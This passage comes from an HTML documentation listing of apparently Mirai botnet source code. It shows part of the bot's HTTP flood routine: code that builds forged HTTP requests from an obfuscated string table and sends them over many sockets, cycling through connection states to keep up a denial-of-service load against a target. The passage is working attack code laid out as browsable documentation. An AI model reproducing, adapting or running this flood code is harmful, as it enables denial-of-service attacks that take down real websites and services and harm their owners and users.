href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> == <a class="code" href="attack_8h.html#a17d0f5a78e9f64122185611485c18222">HTTP_CONN_CONNECTING</a>)</div><div class="line"><a name="l00183"></a><span class="lineno">  183</span>&#160;            {</div><div class="line"><a name="l00184"></a><span class="lineno">  184</span>&#160;                <span class="keywordflow">if</span> (fake_time - conn-&gt;<a class="code" href="structattack__http__state.html#a57ddd53019ddf55a509aae9c74e2ecfa">last_recv</a> &gt; 30)</div><div class="line"><a name="l00185"></a><span class="lineno">  185</span>&#160;                {</div><div class="line"><a name="l00186"></a><span class="lineno">  186</span>&#160;                    conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>;</div><div class="line"><a name="l00187"></a><span class="lineno">  187</span>&#160;                    <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00188"></a><span class="lineno">  188</span>&#160;                    conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> = -1;</div><div class="line"><a name="l00189"></a><span class="lineno">  189</span>&#160;                    <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00190"></a><span class="lineno">  190</span>&#160;                }</div><div class="line"><a name="l00191"></a><span class="lineno">  191</span>&#160;</div><div class="line"><a name="l00192"></a><span class="lineno">  192</span>&#160;                FD_SET(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, &amp;fdset_wr);</div><div class="line"><a name="l00193"></a><span class="lineno">  193</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> &gt; mfd)</div><div class="line"><a name="l00194"></a><span class="lineno">  194</span>&#160;                    mfd = conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> + 1;</div><div class="line"><a name="l00195"></a><span class="lineno">  195</span>&#160;            }</div><div class="line"><a name="l00196"></a><span class="lineno">  196</span>&#160;            <span class="keywordflow">else</span> <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> == <a class="code" href="attack_8h.html#aff008d93b76d40a67da697001e176f6b">HTTP_CONN_SEND</a>)</div><div class="line"><a name="l00197"></a><span class="lineno">  197</span>&#160;            {</div><div class="line"><a name="l00198"></a><span class="lineno">  198</span>&#160;                conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a> = -1; </div><div class="line"><a name="l00199"></a><span class="lineno">  199</span>&#160;                conn-&gt;<a class="code" href="structattack__http__state.html#a97f15ea73d0347511f511318f0949e86">protection_type</a> = 0;</div><div class="line"><a name="l00200"></a><span class="lineno">  200</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a>(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>, <a class="code" href="attack_8h.html#ac6eda2a3273daf4a93162bb51f969093">HTTP_RDBUF_SIZE</a>);</div><div class="line"><a name="l00201"></a><span class="lineno">  201</span>&#160;                conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a> = 0;</div><div class="line"><a name="l00202"></a><span class="lineno">  202</span>&#160;</div><div class="line"><a name="l00203"></a><span class="lineno">  203</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00204"></a><span class="lineno">  204</span>&#160;                <span class="comment">//printf(&quot;[http flood] Sending http request\n&quot;);</span></div><div class="line"><a name="l00205"></a><span class="lineno">  205</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00206"></a><span class="lineno">  206</span>&#160;</div><div class="line"><a name="l00207"></a><span class="lineno">  207</span>&#160;                <span class="keywordtype">char</span> buf[10240];</div><div class="line"><a name="l00208"></a><span class="lineno">  208</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a>(buf, 10240);</div><div class="line"><a name="l00209"></a><span class="lineno">  209</span>&#160;</div><div class="line"><a name="l00210"></a><span class="lineno">  210</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), conn-&gt;<a class="code" href="structattack__http__state.html#a8e432d9597a1eafb950e8d2e82f677c1">method</a>);</div><div class="line"><a name="l00211"></a><span class="lineno">  211</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot; &quot;</span>);</div><div class="line"><a name="l00212"></a><span class="lineno">  212</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), conn-&gt;<a class="code" href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">path</a>);</div><div class="line"><a name="l00213"></a><span class="lineno">  213</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot; HTTP/1.1\r\nUser-Agent: &quot;</span>);</div><div class="line"><a name="l00214"></a><span class="lineno">  214</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), conn-&gt;<a class="code" href="structattack__http__state.html#a3809782e42bb4bc6df9e5af0e054d65e">user_agent</a>);</div><div class="line"><a name="l00215"></a><span class="lineno">  215</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot;\r\nHost: &quot;</span>);</div><div class="line"><a name="l00216"></a><span class="lineno">  216</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), conn-&gt;<a class="code" href="structattack__http__state.html#a706d58c70ae03423d8b1af95c2aaf8ca">domain</a>);</div><div class="line"><a name="l00217"></a><span class="lineno">  217</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00218"></a><span class="lineno">  218</span>&#160;</div><div class="line"><a name="l00219"></a><span class="lineno">  219</span>&#160;                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#af12a034b04caa3e4ac948b0ef4761da6">TABLE_ATK_KEEP_ALIVE</a>);</div><div class="line"><a name="l00220"></a><span class="lineno">  220</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#af12a034b04caa3e4ac948b0ef4761da6">TABLE_ATK_KEEP_ALIVE</a>, NULL));</div><div class="line"><a name="l00221"></a><span class="lineno">  221</span>&#160;                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#af12a034b04caa3e4ac948b0ef4761da6">TABLE_ATK_KEEP_ALIVE</a>);</div><div class="line"><a name="l00222"></a><span class="lineno">  222</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00223"></a><span class="lineno">  223</span>&#160;</div><div class="line"><a name="l00224"></a><span class="lineno">  224</span>&#160;                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a2670187e338d8b1b08f699ceb5a7e90c">TABLE_ATK_ACCEPT</a>);</div><div class="line"><a name="l00225"></a><span class="lineno">  225</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a2670187e338d8b1b08f699ceb5a7e90c">TABLE_ATK_ACCEPT</a>, NULL));</div><div class="line"><a name="l00226"></a><span class="lineno">  226</span>&#160;                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#a2670187e338d8b1b08f699ceb5a7e90c">TABLE_ATK_ACCEPT</a>);</div><div class="line"><a name="l00227"></a><span class="lineno">  227</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00228"></a><span class="lineno">  228</span>&#160;</div><div class="line"><a name="l00229"></a><span class="lineno">  229</span>&#160;                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#abe6c60026b1f1980e83e5759b5246c5e">TABLE_ATK_ACCEPT_LNG</a>);</div><div class="line"><a name="l00230"></a><span class="lineno">  230</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#abe6c60026b1f1980e83e5759b5246c5e">TABLE_ATK_ACCEPT_LNG</a>, NULL));</div><div class="line"><a name="l00231"></a><span class="lineno">  231</span>&#160;                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#abe6c60026b1f1980e83e5759b5246c5e">TABLE_ATK_ACCEPT_LNG</a>);</div><div class="line"><a name="l00232"></a><span class="lineno">  232</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00233"></a><span class="lineno">  233</span>&#160;</div><div class="line"><a name="l00234"></a><span class="lineno">  234</span>&#160;                <span class="keywordflow">if</span> (postdata != NULL)</div><div class="line"><a name="l00235"></a><span class="lineno">  235</span>&#160;                {</div><div class="line"><a name="l00236"></a><span class="lineno">  236</span>&#160;                    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a1f919690118832e6a9c5680ca6ab8686">TABLE_ATK_CONTENT_TYPE</a>);</div><div class="line"><a name="l00237"></a><span class="lineno">  237</span>&#160;                    <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a1f919690118832e6a9c5680ca6ab8686">TABLE_ATK_CONTENT_TYPE</a>, NULL));</div><div class="line"><a name="l00238"></a><span class="lineno">  238</span>&#160;                    <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#a1f919690118832e6a9c5680ca6ab8686">TABLE_ATK_CONTENT_TYPE</a>);</div><div class="line"><a name="l00239"></a><span class="lineno">  239</span>&#160;</div><div class="line"><a name="l00240"></a><span class="lineno">  240</span>&#160;                    <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00241"></a><span class="lineno">  241</span>&#160;                    <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a98de50549fdb839f2ba413f44e0d3e6a">TABLE_ATK_CONTENT_LENGTH_HDR</a>, NULL));</div><div class="line"><a name="l00242"></a><span class="lineno">  242</span>&#160;                    <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot; &quot;</span>);</div><div class="line"><a name="l00243"></a><span class="lineno">  243</span>&#160;                    <a class="code" href="mirai_2bot_2util_8c.html#a98833e069ccfb346a13512872cd21a6c">util_itoa</a>(<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(postdata), 10, buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf));</div><div class="line"><a name="l00244"></a><span class="lineno">  244</span>&#160;                    <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00245"></a><span class="lineno">  245</span>&#160;                }</div><div class="line"><a name="l00246"></a><span class="lineno">  246</span>&#160;</div><div class="line"><a name="l00247"></a><span class="lineno">  247</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a> &gt; 0)</div><div class="line"><a name="l00248"></a><span class="lineno">  248</span>&#160;                {</div><div class="line"><a name="l00249"></a><span class="lineno">  249</span>&#160;                    <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot;Cookie: &quot;</span>);</div><div class="line"><a name="l00250"></a><span class="lineno">  250</span>&#160;                    <span class="keywordflow">for</span> (ii = 0; ii &lt; conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a>; ii++)</div><div class="line"><a name="l00251"></a><span class="lineno">  251</span>&#160;                    {</div><div class="line"><a name="l00252"></a><span class="lineno">  252</span>&#160;                        <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), conn-&gt;<a class="code" href="structattack__http__state.html#a93cf57948e424620047d9381b73f8fcd">cookies</a>[ii]);</div><div class="line"><a name="l00253"></a><span class="lineno">  253</span>&#160;                        <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot;; &quot;</span>);</div><div class="line"><a name="l00254"></a><span class="lineno">  254</span>&#160;                    }</div><div class="line"><a name="l00255"></a><span class="lineno">  255</span>&#160;                    <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00256"></a><span class="lineno">  256</span>&#160;                }</div><div class="line"><a name="l00257"></a><span class="lineno">  257</span>&#160;</div><div class="line"><a name="l00258"></a><span class="lineno">  258</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00259"></a><span class="lineno">  259</span>&#160;</div><div class="line"><a name="l00260"></a><span class="lineno">  260</span>&#160;                <span class="keywordflow">if</span> (postdata != NULL)</div><div class="line"><a name="l00261"></a><span class="lineno">  261</span>&#160;                    <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(buf + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), postdata);</div><div class="line"><a name="l00262"></a><span class="lineno">  262</span>&#160;</div><div class="line"><a name="l00263"></a><span class="lineno">  263</span>&#160;                <span class="keywordflow">if</span> (!<a class="code" href="mirai_2bot_2util_8c.html#a4ac4793080569db24ebca3104041425b">util_strcmp</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a8e432d9597a1eafb950e8d2e82f677c1">method</a>, conn-&gt;<a class="code" href="structattack__http__state.html#a8119cf4b9557d805cd226410a206391a">orig_method</a>))</div><div class="line"><a name="l00264"></a><span class="lineno">  264</span>&#160;                    <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a8e432d9597a1eafb950e8d2e82f677c1">method</a>, conn-&gt;<a class="code" href="structattack__http__state.html#a8119cf4b9557d805cd226410a206391a">orig_method</a>);</div><div class="line"><a name="l00265"></a><span class="lineno">  265</span>&#160;</div><div class="line"><a name="l00266"></a><span class="lineno">  266</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00267"></a><span class="lineno">  267</span>&#160;                <span class="keywordflow">if</span> (sockets == 1)</div><div class="line"><a name="l00268"></a><span class="lineno">  268</span>&#160;                {</div><div class="line"><a name="l00269"></a><span class="lineno">  269</span>&#160;                    printf(<span class="stringliteral">&quot;sending buf: \&quot;%s\&quot;\n&quot;</span>, buf);</div><div class="line"><a name="l00270"></a><span class="lineno">  270</span>&#160;                }</div><div class="line"><a name="l00271"></a><span class="lineno">  271</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00272"></a><span class="lineno">  272</span>&#160;</div><div class="line"><a name="l00273"></a><span class="lineno">  273</span>&#160;                send(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, buf, <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(buf), MSG_NOSIGNAL);</div><div class="line"><a name="l00274"></a><span class="lineno">  274</span>&#160;                conn-&gt;<a class="code" href="structattack__http__state.html#a639ffb1e3a835ba06d0d33f1f9b26328">last_send</a> = fake_time;</div><div class="line"><a name="l00275"></a><span class="lineno">  275</span>&#160;</div><div class="line"><a name="l00276"></a><span class="lineno">  276</span>&#160;                conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#abedf69cb8cdb85bfc7f307503fd62775">HTTP_CONN_RECV_HEADER</a>;</div><div class="line"><a name="l00277"></a><span class="lineno">  277</span>&#160;                FD_SET(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, &amp;fdset_rd);</div><div class="line"><a name="l00278"></a><span class="lineno">  278</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> &gt; mfd)</div><div class="line"><a name="l00279"></a><span class="lineno">  279</span>&#160;                    mfd = conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> + 1;</div><div class="line"><a name="l00280"></a><span class="lineno">  280</span>&#160;            }</div><div class="line"><a name="l00281"></a><span class="lineno">  281</span>&#160;            <span class="keywordflow">else</span> <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> == <a class="code" href="attack_8h.html#abedf69cb8cdb85bfc7f307503fd62775">HTTP_CONN_RECV_HEADER</a>)</div><div class="line"><a name="l00282"></a><span class="lineno">  282</span>&#160;            {</div><div class="line"><a name="l00283"></a><span class="lineno">  283</span>&#160;                FD_SET(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, &amp;fdset_rd);</div><div class="line"><a name="l00284"></a><span class="lineno">  284</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> &gt; mfd)</div><div class="line"><a name="l00285"></a><span class="lineno">  285</span>&#160;                    mfd = conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> + 1;</div><div class="line"><a name="l00286"></a><span class="lineno">  286</span>&#160;            }</div><div class="line"><a name="l00287"></a><span class="lineno">  287</span>&#160;            <span class="keywordflow">else</span> <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> == <a class="code" href="attack_8h.html#a9fe6114dced0ca47726f7afd1b3890f1">HTTP_CONN_RECV_BODY</a>)</div><div class="line"><a name="l00288"></a><span class="lineno">  288</span>&#160;            {</div><div class="line"><a name="l00289"></a><span class="lineno">  289</span>&#160;                FD_SET(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, &amp;fdset_rd);</div><div class="line"><a name="l00290"></a><span class="lineno">  290</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> &gt; mfd)</div><div class="line"><a name="l00291"></a><span class="lineno">  291</span>&#160;                    mfd = conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> + 1;</div><div class="line"><a name="l00292"></a><span class="lineno">  292</span>&#160;            }</div><div class="line"><a name="l00293"></a><span class="lineno">  293</span>&#160;            <span class="keywordflow">else</span> <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> == <a class="code" href="attack_8h.html#a91cd4ed6175b666edf34c1a23bbbe368">HTTP_CONN_QUEUE_RESTART</a>)</div><div class="line"><a name="l00294"></a><span class="lineno">  294</span>&#160;            {</div><div class="line"><a name="l00295"></a><span class="lineno">  295</span>&#160;                FD_SET(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, &amp;fdset_rd);</div><div class="line"><a name="l00296"></a><span class="lineno">  296</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> &gt; mfd)</div><div class="line"><a name="l00297"></a><span class="lineno">  297</span>&#160;                    mfd = conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> + 1;</div><div class="line"><a name="l00298"></a><span class="lineno">  298</span>&#160;            }</div><div class="line"><a name="l00299"></a><span class="lineno">  299</span>&#160;            <span class="keywordflow">else</span> <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> == <a class="code" href="attack_8h.html#afb5c550090ed0a9640f362e9897ee7cd">HTTP_CONN_CLOSED</a>)</div><div class="line"><a name="l00300"></a><span class="lineno">  300</span>&#160;            {</div><div class="line"><a name="l00301"></a><span class="lineno">  301</span>&#160;                conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>;</div><div class="line"><a name="l00302"></a><span class="lineno">  302</span>&#160;                <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00303"></a><span class="lineno">  303</span>&#160;                conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> = -1;</div><div class="line"><a name="l00304"></a><span class="lineno">  304</span>&#160;            }</div><div class="line"><a name="l00305"></a><span class="lineno">  305</span>&#160;            <span class="keywordflow">else</span></div><div class="line"><a name="l00306"></a><span class="lineno">  306</span>&#160;            {</div><div class="line"><a name="l00307"></a><span class="lineno">  307</span>&#160;                <span class="comment">// NEW STATE WHO DIS</span></div><div class="line"><a name="l00308"></a><span class="lineno">  308</span>&#160;                conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>;</div><div class="line"><a name="l00309"></a><span class="lineno">  309</span>&#160;                <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00310"></a><span class="lineno">  310</span>&#160;                conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> = -1;</div><div class="line"><a name="l00311"></a><span class="lineno">  311</span>&#160;            }</div><div class="line"><a name="l00312"></a><span class="lineno">  312</span>&#160;        }</div><div class="line"><a name="l00313"></a><span class="lineno">  313</span>&#160;</div><div class="line"><a name="l00314"></a><span class="lineno">  314</span>&#160;        <span class="keywordflow">if</span> (mfd == 0)</div><div class="line"><a name="l00315"></a><span class="lineno">  315</span>&#160;            <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00316"></a><span class="lineno">  316</span>&#160;</div><div class="line"><a name="l00317"></a><span class="lineno">  317</span>&#160;        tim.tv_usec = 0;</div><div class="line"><a name="l00318"></a><span class="lineno">  318</span>&#160;        tim.tv_sec = 1;</div><div class="line"><a name="l00319"></a><span class="lineno">  319</span>&#160;        nfds = select(mfd, &amp;fdset_rd, &amp;fdset_wr, NULL, &amp;tim);</div><div class="line"><a name="l00320"></a><span class="lineno">  320</span>&#160;        fake_time = time(NULL);</div><div class="line"><a name="l00321"></a><span class="lineno">  321</span>&#160;</div><div class="line"><a name="l00322"></a><span class="lineno">  322</span>&#160;        <span class="keywordflow">if</span> (nfds &lt; 1)</div><div class="line"><a name="l00323"></a><span class="lineno">  323</span>&#160;            <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00324"></a><span class="lineno">  324</span>&#160;</div><div class="line"><a name="l00325"></a><span class="lineno">  325</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; sockets; i++)</div><div class="line"><a name="l00326"></a><span class="lineno">  326</span>&#160;        {</div><div class="line"><a name="l00327"></a><span class="lineno">  327</span>&#160;            conn = &amp;(http_table[i]);</div><div class="line"><a 